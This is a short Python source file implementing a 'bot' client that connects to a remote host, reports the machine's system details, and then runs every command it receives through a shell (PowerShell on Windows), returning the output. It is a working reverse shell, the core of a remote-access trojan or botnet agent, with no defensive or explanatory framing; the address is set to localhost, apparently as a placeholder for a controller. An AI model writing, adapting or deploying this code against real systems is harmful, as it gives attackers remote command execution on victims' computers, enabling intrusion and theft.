import socket
import subprocess
import platform
import os
import time
class bot:
    def __init__(self, host, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host
        self.port = port
        self.client.connect((host, port))
        self.system = platform.uname().system
        self.say_hello()

    def say_hello(self):
        info = [
            platform.uname().system,
            platform.uname().node,
            platform.uname().release,
            platform.uname().version,
            platform.uname().machine,
            platform.uname().processor
            ]
        for i in info:
            self.client.send((i+'\n').encode())


    def shell(self):
        while True:
            data = self.client.recv(20480)
            print(data.decode())
            self.execute(data.decode())

    def execute(self, command):
        if self.system == 'Windows':
            output = subprocess.Popen('powershell ' + command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        else:
            output = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            
        stdout = output.stdout.read()
        stderr = output.stderr.read()

        if stdout:
            self.client.send(stdout)
            stdout=False
            stderr=False
        elif stderr:
            self.client.send(stderr)
            stdout=False
            stderr=False
        else:
            self.client.send(b'no output receieved')

        

if __name__ == '__main__':
    n = bot('127.0.0.1', 4567)
    n.shell()